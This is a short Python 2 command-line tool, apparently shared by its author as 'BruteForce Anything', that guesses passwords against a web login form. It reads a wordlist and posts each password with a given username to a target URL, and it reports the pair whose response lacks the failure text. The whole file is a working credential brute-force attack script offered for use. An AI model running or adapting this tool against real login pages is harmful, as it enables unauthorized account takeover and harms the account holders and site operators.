#Author: Daniel Victor Freire Feitosa
#Version: 1.0
#Twitter: @DanielFreire00
#Youtube: youtube.com/channel/UCKIL1n8YdEaYXQxhKMth6aA
# -*- coding: utf-8 -*-
import sys,requests,os,time,argparse
os.system("color 0a && cls")
#os.system("clear")#if linux
print ""
print " ______            _        ___              "
print " | ___ \          | |      / _ \             "
print " | |_/ /_ __ _   _| |_ ___/ /_\ \_ __  _   _ "
print " | ___ \ '__| | | | __/ _ \  _  | '_ \| | | |"
print " | |_/ / |  | |_| | ||  __/ | | | | | | |_| |"
print " \____/|_|   \__,_|\__\___\_| |_/_| |_|\__, |"
print "                                        __/ |"
print "                                       |___/"
print ""
print "                                   by Daniel Freire"
print ""
try:
	parser = argparse.ArgumentParser(
		formatter_class=argparse.RawTextHelpFormatter,
		description='BruteForce Anything !')
	parser.add_argument(
		'-u', '--url',
		default=None, help='Example : http://example.com/login.php')
	parser.add_argument(
		'-U', '--username',
		default=None, help='Example : Admin')
	parser.add_argument(
		'-w', '--wordlist',
		default=None, help='Example : wordlist.txt')
	parser.add_argument(
		'-p1', '--param1',
		default=None, help='Example : email')
	parser.add_argument(
		'-p2', '--param2',
		default=None, help='Example : pass')
	parser.add_argument(
		'-f', '--fail',
		default='Login', help='Ex: senha incorreta')
	args = parser.parse_args()

	print ""
	try:
		try:
			wordlist=open(args.wordlist, "r")
		except:
			print "\n[!] Wordlist nao encontrada ..."
			exit()
		for i in wordlist:
			password=i.strip()
			sys.stdout.write("\r[!] Password test : " + password)
			sys.stdout.flush()
			data={args.param1 : args.username, args.param2 : password}
			r=requests.post(args.url, data=data)
			if not args.fail in r.content:
				print ""
				print "\r\n**** Bruteforce Sucess ! *****"
				print "\r\n[+] Login : %s \n[+] Password : %s" % (args.username,password)
				print ('\n[-] Termino do script : %s' % time.strftime('%H:%M:%S'))
				wordlist.close()
				exit()
	except KeyboardInterrupt:
		print "\n[x] Saindo ..."
		exit()
except:
	print "\n[i] Digite : brute_any.py -h"